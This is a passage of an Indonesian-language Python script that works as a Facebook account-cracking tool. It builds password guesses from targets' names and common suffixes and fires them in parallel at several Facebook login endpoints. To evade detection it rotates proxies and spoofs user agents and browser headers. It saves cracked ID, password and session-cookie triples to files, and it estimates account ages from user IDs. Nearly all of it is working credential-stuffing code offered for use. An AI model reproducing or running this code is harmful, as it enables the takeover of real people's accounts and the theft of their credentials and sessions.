        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
        time.sleep(3)
        exit()

    file_map = {}
    for idx, file in enumerate(files, start=1):
        try:
            jumlah = len(open(f"{folder}/{file}", "r").readlines())
        except:
            continue
        num = f"{idx:02}"
        file_map[str(idx)] = file
        file_map[num] = file
        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))

    pilih_file(file_map, folder, warna_akun)

def pilih_file(file_map, folder, warna_akun):
    pilihan = console.input(f" {H2}• {P2}Masukan : ").strip()
    
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
        exit()
    
    file_path = f"{folder}/{file_map[pilihan]}"
    
    try:
        with open(file_path, "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan")
        time.sleep(3)
        exit()
    
    for line in lines:
        data = line.split("|")
        
        if len(data) == 3:
            user, password, cookie = data
            console.print(Panel(f" ID : {user} PASSWORD : {password} | COOKIE : {cookie}", width=60, style=warna_akun))
        elif len(data) == 2:
            id, pw = data
            console.print(Panel(f" ID : {id} PASSWORD : {pw}", width=60, style=warna_akun))
        else:
            console.print(f" {H2}• {P2}Format data tidak valid: {line}")
    
    console.input(f" {H2}• {P2}[ {M2}Klik Enter Untuk Keluar {P2}]")
    exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)


def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz

# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        console.print(f" {H2}• [bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}03{P2}] CRACK FACEBOOK RANDOM [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        print("[bold red]Error:[/bold red] Pilihan tidak valid, coba lagi.")
        return setting()  # Rekursi untuk mengulang input


    # Input untuk metode login
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
    if fankylog in ["1", "01"]:
    	method.append("fankygraph")
    elif fankylog in ["2", "02"]:
    	method.append("fankygraphv2")
    elif fankylog in ["3", "03"]:
    	method.append("fankywww")
    elif fankylog in ["4", "04"]:
    	method.append("fankybapi")
    else:
    	method.append("fankygraph")  # Default metode
    # Pengaturan User-Agent
    Console().print(Panel(
        f"[bold white]Ingin Menggunakan UA Manual? Y/T",
        title="[bold green]😎",
        width=60,
        style=f"{color_panel}"
    ))
    uatambah = console.input(f" {H2}• {P2}Masukan : ").strip()
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ").strip()
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

     # Pilihan kecepatan metode
    #metcepat()
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}",width=60,style=f"{color_panel}"))
    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()  # Default ke metode cepat
        

# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW-FANKY-GANTENG",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["indonesia123","bismillah123","sayangku123"]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "fankygraph" in method:
                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankytouch,idf,pwv)
                elif "fankybapi" in method:
                	pool.submit(fanky_b_api,idf,pwv)
                else:
                	pool.submit(fanky_b_api,idf,pwv)
                
                	
                	
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")


#-------------------[ CRACK-CEPAT ]------------#
def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel(f'[bold white]hidup/MAINKAN MODE PESAWAT SETIAP [bold green]300[bold yellow] ID ',title=f"[bold yellow]",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","sayangku123","indonesia123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "fankygraph" in method:
                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankytouch,idf,pwv)
                elif "fankybapi" in method:
                	pool.submit(fanky_b_api,idf,pwv)
                else:
                	pool.submit(fanky_b_api,idf,pwv)
 
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")
#-------------------[ CRACK-MAIN ]------------#
def fankywww(idf, pwv):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f"{K2}Crack{H2} 🔥 {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
     #ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get(f'https://touch.alpha.facebook.com/login.php?')
            head = {
                'authority': 'touch.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '1.600000023841858',
                'origin': 'https://touch.alpha.facebook.com',
                'referer': 'https://touch.alpha.facebook.com/',
                'accept-encoding': 'br, gzip',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'viewport-width': '980'
            }
            data = {
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
                'email': idf,
                'pass': pw,
                'next': ''
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1
#-------------------[ CRACK-MAIN ]------------#
def fanky_b_api(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    # ua = random.choice(ugen)
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} Crack.. 💥 {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "prefill_contact_point": idf,
                "prefill_source": "provided_or_soft_matched",
                "prefill_type": "contact_point",
                "first_prefill_source": "provided_or_soft_matched",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": "true",
                "had_password_prefilled": "false",
                "is_smart_lock": "false",
                "_fb_noscript": "true",
                "email": idf,
                "pass": pw
            }
            head = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": "https://iphone.facebook.com/",
                "Origin": "https://iphone.facebook.com",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "DNT": "1"
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1
# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        os.system("clear")
    except:
        pass
    login()
    